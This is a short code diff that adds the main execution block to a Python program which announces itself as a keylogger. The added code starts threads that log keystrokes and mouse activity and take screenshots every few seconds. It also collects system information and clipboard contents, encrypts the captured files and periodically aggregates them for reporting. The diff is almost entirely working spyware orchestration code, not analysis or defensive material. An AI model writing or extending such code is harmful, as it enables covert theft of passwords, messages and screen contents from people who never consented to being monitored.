@@ -214,3 +214,35 @@ class ScreenCapture:
             screenshot.save(self.file_path + screenshot_filename)
             encrypt_file(self.file_path + screenshot_filename, self.key)
             time.sleep(self.interval)
+
+# Main Execution
+if __name__ == "__main__":
+    print("Starting keylogger. Press Ctrl+C to stop.")
+    try:
+        encryption_key = generate_encryption_key()
+        gather_system_information(file_path + extend + system_information, encryption_key)
+        log_clipboard(file_path + extend + clipboard_information, encryption_key)
+
+        keylogger = KeyLogger(file_path + extend + keys_information, encryption_key)
+        keylogger_thread = threading.Thread(target=keylogger.start)
+        keylogger_thread.start()
+
+        mouselogger = MouseLogger(file_path + extend + mouse_information, encryption_key)
+        mouselogger_thread = threading.Thread(target=mouselogger.start)
+        mouselogger_thread.start()
+
+        screen_capturer = ScreenCapture(file_path + extend, 5, 60, encryption_key)
+        screen_capture_thread = threading.Thread(target=screen_capturer.capture)
+        screen_capture_thread.start()
+
+        while True:
+            time.sleep(SEND_REPORT_EVERY)
+            aggregate_data(encryption_key)
+    
+    except KeyboardInterrupt:
+        stop_threads = True
+        print("Shutting down...")
+        keylogger_thread.join()
+        mouselogger_thread.join()
+        screen_capture_thread.join()
+        print("Shutdown complete.")
